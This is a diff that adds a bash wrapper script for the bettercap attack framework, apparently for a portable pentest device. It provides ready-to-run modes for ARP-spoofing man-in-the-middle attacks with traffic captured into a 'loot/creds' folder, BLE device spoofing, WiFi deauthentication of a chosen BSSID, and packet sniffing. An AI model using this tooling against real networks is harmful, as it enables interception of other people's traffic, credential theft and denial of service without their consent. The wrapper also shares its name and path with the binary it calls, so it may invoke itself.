@@ -1,0 +1,224 @@
+#!/bin/bash
+set -euo pipefail
+# /usr/local/bin/bettercap
+# Bettercap MITM + BLE attack framework wrapper
+# Usage: bettercap <mode> [options]
+# Modes: mitm, ble, wifi, sniff, interactive, help
+
+LOOT="/opt/cardputer/loot/creds"
+CONF_DIR="/opt/cardputer/config/bettercap"
+mkdir -p "$LOOT" "$CONF_DIR"
+
+check_bettercap() {
+    if ! command -v bettercap &>/dev/null; then
+        echo "[!] bettercap not found. Install: apt install bettercap"
+        exit 1
+    fi
+}
+
+case "${1:-help}" in
+    mitm|--mitm|-m)
+        check_bettercap
+        IFACE="${2:-eth0}"
+        TARGET="${3:-}"
+
+        if [ "$(id -u)" -ne 0 ]; then
+            echo "[!] Root required."
+            exit 1
+        fi
+
+        echo "[*] Bettercap MITM Attack"
+        echo "[*] Interface: $IFACE"
+        [ -n "$TARGET" ] && echo "[*] Target: $TARGET"
+        echo ""
+
+        CAP_SCRIPT="$CONF_DIR/mitm.cap"
+        cat > "$CAP_SCRIPT" << EOF
+net.probe on
+set net.probe.throttle 5
+EOF
+
+        if [ -n "$TARGET" ]; then
+            cat >> "$CAP_SCRIPT" << EOF
+set arp.spoof.targets $TARGET
+EOF
+        fi
+
+        cat >> "$CAP_SCRIPT" << EOF
+set arp.spoof.internal false
+arp.spoof on
+net.sniff on
+set net.sniff.output $LOOT/bettercap_sniff_$(date +%Y%m%d_%H%M%S).pcap
+EOF
+
+        echo "[+] Launching bettercap with MITM script..."
+        bettercap -iface "$IFACE" -capfile "$CAP_SCRIPT"
+        ;;
+
+    ble|--ble|-b)
+        check_bettercap
+        IFACE="${2:-hci0}"
+        ACTION="${3:-scan}"
+
+        if [ "$(id -u)" -ne 0 ]; then
+            echo "[!] Root required."
+            exit 1
+        fi
+
+        echo "[*] Bettercap BLE Attack"
+        echo "[*] Interface: $IFACE"
+        echo ""
+
+        case "$ACTION" in
+            scan)
+                CAP_SCRIPT="$CONF_DIR/ble_scan.cap"
+                cat > "$CAP_SCRIPT" << 'EOF'
+ble.recon on
+sleep 15
+ble.show
+EOF
+                bettercap -iface "$IFACE" -capfile "$CAP_SCRIPT"
+                ;;
+            enum)
+                MAC="${4:-}"
+                if [ -z "$MAC" ]; then
+                    echo "Usage: bettercap ble enum <mac_address>"
+                    exit 1
+                fi
+                CAP_SCRIPT="$CONF_DIR/ble_enum.cap"
+                cat > "$CAP_SCRIPT" << EOF
+ble.recon on
+ble.enum $MAC
+EOF
+                bettercap -iface "$IFACE" -capfile "$CAP_SCRIPT"
+                ;;
+            spoof)
+                MAC="${4:-}"
+                if [ -z "$MAC" ]; then
+                    echo "Usage: bettercap ble spoof <mac_address>"
+                    exit 1
+                fi
+                CAP_SCRIPT="$CONF_DIR/ble_spoof.cap"
+                cat > "$CAP_SCRIPT" << EOF
+ble.recon on
+set ble.spoof.address $MAC
+ble.spoof on
+EOF
+                bettercap -iface "$IFACE" -capfile "$CAP_SCRIPT"
+                ;;
+            *)
+                echo "[!] Unknown BLE action: $ACTION"
+                echo "Available: scan, enum, spoof"
+                exit 1
+                ;;
+        esac
+        ;;
+
+    wifi|--wifi|-w)
+        check_bettercap
+        IFACE="${2:-wlan0}"
+        ACTION="${3:-scan}"
+
+        if [ "$(id -u)" -ne 0 ]; then
+            echo "[!] Root required."
+            exit 1
+        fi
+
+        case "$ACTION" in
+            scan)
+                echo "[*] Bettercap WiFi Recon"
+                CAP_SCRIPT="$CONF_DIR/wifi_scan.cap"
+                cat > "$CAP_SCRIPT" << 'EOF'
+wifi.recon on
+sleep 15
+wifi.show
+EOF
+                bettercap -iface "$IFACE" -capfile "$CAP_SCRIPT"
+                ;;
+            deauth)
+                BSSID="${4:-}"
+                if [ -z "$BSSID" ]; then
+                    echo "Usage: bettercap wifi deauth <bssid>"
+                    exit 1
+                fi
+                CAP_SCRIPT="$CONF_DIR/wifi_deauth.cap"
+                cat > "$CAP_SCRIPT" << EOF
+wifi.recon on
+set wifi.deauth.all false
+set wifi.deauth.target $BSSID
+wifi.deauth on
+EOF
+                echo "[*] Deauthing BSSID: $BSSID"
+                bettercap -iface "$IFACE" -capfile "$CAP_SCRIPT"
+                ;;
+            *)
+                echo "[!] Unknown WiFi action: $ACTION"
+                echo "Available: scan, deauth"
+                exit 1
+                ;;
+        esac
+        ;;
+
+    sniff|--sniff|-sn)
+        check_bettercap
+        IFACE="${2:-eth0}"
+        OUTFILE="${3:-$LOOT/bettercap_sniff_$(date +%Y%m%d_%H%M%S).pcap}"
+
+        if [ "$(id -u)" -ne 0 ]; then
+            echo "[!] Root required."
+            exit 1
+        fi
+
+        echo "[*] Bettercap Packet Sniffing"
+        echo "[*] Interface: $IFACE"
+        echo "[*] Output: $OUTFILE"
+        echo ""
+
+        CAP_SCRIPT="$CONF_DIR/sniff.cap"
+        cat > "$CAP_SCRIPT" << EOF
+net.sniff on
+set net.sniff.output $OUTFILE
+EOF
+
+        bettercap -iface "$IFACE" -capfile "$CAP_SCRIPT"
+        ;;
+
+    interactive|--interactive|-i)
+        check_bettercap
+        IFACE="${2:-eth0}"
+        echo "[*] Launching bettercap interactive session..."
+        echo "[*] Interface: $IFACE"
+        echo ""
+        bettercap -iface "$IFACE"
+        ;;
+
+    help|--help|-h)
+        echo "Usage: bettercap <mode> [options]"
+        echo ""
+        echo "Bettercap MITM + BLE Attack Framework Wrapper"
+        echo ""
+        echo "Modes:"
+        echo "  mitm [iface] [target]        ARP spoof + sniff MITM"
+        echo "  ble [iface] <action> [mac]   BLE attack (scan/enum/spoof)"
+        echo "  wifi [iface] <action> [bssid] WiFi attack (scan/deauth)"
+        echo "  sniff [iface] [outfile]      Packet capture"
+        echo "  interactive [iface]           Launch interactive session"
+        echo ""
+        echo "Examples:"
+        echo "  sudo bettercap mitm wlan0 192.168.1.100"
+        echo "  sudo bettercap ble hci0 scan"
+        echo "  sudo bettercap ble hci0 enum AA:BB:CC:DD:EE:FF"
+        echo "  sudo bettercap wifi wlan0 deauth AA:BB:CC:DD:EE:FF"
+        echo "  sudo bettercap sniff wlan0"
+        echo "  sudo bettercap interactive"
+        echo ""
+        echo "Requirement: bettercap (apt install bettercap)"
+        exit 0
+        ;;
+
+    *)
+        echo "[!] Unknown mode: $1"
+        echo "Run: bettercap help"
+        exit 1
+        ;;
+esac
